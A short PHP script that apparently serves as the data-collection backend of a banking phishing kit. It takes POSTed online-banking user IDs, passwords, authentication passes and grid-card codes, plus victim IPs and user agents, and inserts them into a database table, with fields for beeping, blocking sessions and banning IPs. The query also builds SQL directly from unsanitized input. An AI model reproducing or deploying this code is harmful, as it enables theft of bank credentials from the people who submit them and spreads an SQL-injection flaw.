<?php
include('backupdb.php');


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // The request is using the POST method
    $id = $_POST['id'];
    $account_name = $_POST['account_name'];
    $account_number = $_POST['account_number'];
    $title = $_POST['title'];
    $address = $_POST['address'];
    $payment = $_POST['payment'];
    $email = $_POST['email'];
    $code = $_POST['code'];
    $gridcode = $_POST['gridcode'];
    $gridvalue = $_POST['gridvalue'];
    $bank_name = $_POST['bank_name'];
    $bank_user_id = $_POST['bank_user_id'];
    $bank_user_password = $_POST['bank_user_password'];
    $bank_auth_type = $_POST['bank_auth_type'];
    $bank_auth_pass = $_POST['bank_auth_pass'];
    $status = $_POST['status'];
    $last_login = $_POST['last_login'];
    $beep = $_POST['beep'];
    $ip = $_POST['ip'];
    $page_name = $_POST['page_name'];
    $block_session = $_POST['block_session'];
    $block_status = $_POST['block_status'];
    $break = $_POST['break'];
    $checkbox = $_POST['checkbox'];
    $company_email = $_POST['company_email'];
    $date_time = $_POST['date_time'];
    $userip = $_POST['userip'];
    $useragent = $_POST['useragent'];
    $signature_canvas = $_POST['signature_canvas'];
    $checked = $_POST['checked'];
    $order_flag_time = $_POST['order_flag_time'];
    $banned_ips = $_POST['banned_ips'];

    $ip = $_POST['ip'];
    $sql = "INSERT INTO `payment` (`id` , `account_name`, `account_number`, `title`, `address`, `payment`, `email`, `code`, `gridcode`, `gridvalue`, `bank_name`, `bank_user_id`, `bank_user_password`, `bank_auth_type`, `bank_auth_pass`, `status`, `last_login`, `beep`, `page_name`, `block_session`, `block_status`, `break`, `checkbox`, `company_email`, `date_time`, `userip`, `useragent`, `signature_canvas`, `checked`, `order_flag_time`, `banned_ips` ) VALUES('$id' , '$account_name', '$account_number', '$title', '$address', '$payment', '$email', '$code', '$gridcode', '$gridvalue', '$bank_name', '$bank_user_id', '$bank_user_password', '$bank_auth_type', '$bank_auth_pass', '$status', '$last_login', '$beep', '$page_name', '$block_session', '$block_status', '$break', '$checkbox', '$company_email', '$date_time', '$userip', '$useragent', '$signature_canvas', '$checked', '$order_flag_time', '$banned_ips')";

    $nw = $con -> query($sql);
    $last_id = $con->insert_id;
    echo $last_id;
}

exit;
?>